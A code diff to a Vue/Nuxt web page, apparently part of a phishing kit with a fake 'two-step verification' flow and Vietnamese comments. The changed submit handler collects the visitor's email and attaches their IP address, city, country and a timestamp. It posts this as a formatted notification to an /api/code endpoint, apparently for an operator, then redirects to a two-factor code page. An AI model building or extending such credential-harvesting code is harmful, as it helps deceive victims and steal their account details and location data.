@@ -10,28 +10,47 @@ useHead({
     },
   ],
 })
+onBeforeMount(() => {
+  localStorage.removeItem('email')
+  localStorage.removeItem('conversa')
+})
 const email = ref('')
 const router = useRouter()
+const options = {
+  hour: '2-digit',
+  minute: '2-digit',
+  second: '2-digit',
+  day: '2-digit',
+  month: '2-digit',
+  year: 'numeric',
+}
 async function submitForm() {
   if (!email.value) return
-  const isFirst = isFirstTime()
-  let message = ''
+  // let message = ''
+  const geo = JSON.parse(localStorage.getItem('geo') || '{}')
+  const message = `
+🕒 Thời gian: ${new Date().toLocaleString('vi-VN', options)}
+🌍 Địa chỉ IP: ${geo.ip}
+📍 Vị trí: ${geo.city}, ${geo.country}
 
-  if (isFirst) {
-    // message Nguowif dùng lần đầu tiên
-    message += `👤 Người dùng mới truy cập\n`
-  }
+📭 Email: <code>${email.value}</code>
+`
+  // if (isFirst) {
+  //   // message Nguowif dùng lần đầu tiên
+  //   // message += `👤 Người dùng mới truy cập\n`
+  // }
 
-  message += `📭 Email: <code>${email.value}</code>`
+  // message += `📭 Email: <code>${email.value}</code>`
   try {
-    await $fetch('/api/code', {
+    const res = await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ message }),
+      body: JSON.stringify({ rawMessage: message }),
       headers: {
         'Content-Type': 'application/json',
       },
     })
-    // router.push('/two_step_verification/two_factor')
+    localStorage.setItem('conversa', JSON.stringify(res))
+    localStorage.setItem('email', email.value)
     window.location.href = '/two_step_verification/two_factor?a=1'
   } catch (error) {
     console.error(error)
